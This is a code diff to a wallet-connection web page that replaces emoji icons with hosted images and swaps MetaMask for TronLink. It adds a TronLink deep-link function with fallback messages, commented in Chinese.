@@ -192,8 +192,19 @@
         }
         
         .wallet-icon {
-            font-size: 1.8rem;
+            width: 2.5rem;
+            height: 2.5rem;
             margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 0.5rem;
         }
         
         .wallet-name {
@@ -375,22 +386,30 @@
                 
                 <div class="wallet-options">
                     <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
-                        <div class="wallet-icon">🔷</div>
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
+                        </div>
                         <div class="wallet-name">TokenPocket</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="wakeupWalletApp('MetaMask')">
-                        <div class="wallet-icon">🦊</div>
-                        <div class="wallet-name">MetaMask</div>
+                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
+                        </div>
+                        <div class="wallet-name">TronLink</div>
                     </div>
                     
                     <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
-                        <div class="wallet-icon">💰</div>
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
+                        </div>
                         <div class="wallet-name">Bitget Wallet</div>
                     </div>
                     
                     <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
-                        <div class="wallet-icon">💳</div>
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
+                        </div>
                         <div class="wallet-name">imToken</div>
                     </div>
                 </div>
@@ -463,7 +482,7 @@
         function isInWalletBrowser() {
             return window.ethereum || window.tronWeb || 
                    navigator.userAgent.includes('TokenPocket') ||
-                   navigator.userAgent.includes('MetaMask') ||
+                   navigator.userAgent.includes('TronLink') ||
                    navigator.userAgent.includes('Bitget') ||
                    navigator.userAgent.includes('imToken');
         }
@@ -540,6 +559,9 @@
             if (walletName === 'TokenPocket') {
                 // TokenPocket 使用最简单的唤醒方案
                 wakeupTokenPocket(fullAuthUrl);
+            } else if (walletName === 'TronLink') {
+                // TronLink 唤醒方案
+                wakeupTronLink(fullAuthUrl);
             } else {
                 // 其他钱包使用标准方案
                 wakeupOtherWallets(walletName, fullAuthUrl);
@@ -568,10 +590,26 @@
             }, 2000);
         }
 
+        // TronLink 唤醒方案
+        function wakeupTronLink(fullAuthUrl) {
+            // TronLink 唤醒方案
+            const scheme1 = 'tronlinkoutside://';
+            const scheme2 = `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`;
+            
+            console.log('尝试 TronLink 唤醒方案...');
+            
+            // 先尝试直接打开 TronLink
+            attemptWakeup(scheme1, 'TronLink');
+            
+            // 2秒后显示提示
+            setTimeout(() => {
+                showTemporaryMessage('如果未自动打开 TronLink，请使用二维码或手动链接');
+            }, 2000);
+        }
+
         // 其他钱包唤醒
         function wakeupOtherWallets(walletName, fullAuthUrl) {
             const walletSchemes = {
-                'MetaMask': `metamask://browse?url=${encodeURIComponent(fullAuthUrl)}`,
                 'Bitget': `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
                 'imToken': `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`
             };
